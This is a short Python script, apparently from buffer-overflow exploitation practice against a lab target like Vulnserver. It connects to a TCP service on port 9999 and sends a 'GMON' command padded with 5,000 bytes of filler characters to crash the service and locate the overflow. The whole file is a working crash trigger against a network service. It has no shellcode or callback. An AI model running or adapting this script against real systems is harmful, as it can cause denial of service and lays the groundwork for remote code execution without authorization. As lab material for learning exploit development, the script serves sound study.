 #!/usr/bin/python
import os 
import sys
import socket
ipAddr="192.168.1.104"
ipPort=9999

def start_me():
	try:
		global ipAddr
		global ipPort
		command="GMON ./:/"
		command=command + "A" * 1000
		command=command + "B" * 1000
		command=command + "C" * 1000
		command=command + "D" * 1000
		command=command + "E" * 1000
		sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		#print("testing11")
		try:
			if sys.argv[1] != None and sys.argv[2] != None:
				ipAddr=sys.argv[1]
				ipPort=sys.argv[2]
		except Exception as ee:
			pass
		
		#print("testin22g")
		sock.connect((ipAddr,int(ipPort)))
		rec=sock.recv(1024)
		print('Rec Banner initially is : ' +str(rec))
		sock.send(command)
		rec=sock.recv(1024)
		print('Rec after is : ' +str(rec))
	except Exception as ex:
		print("Exception : " +str(ex))


start_me()
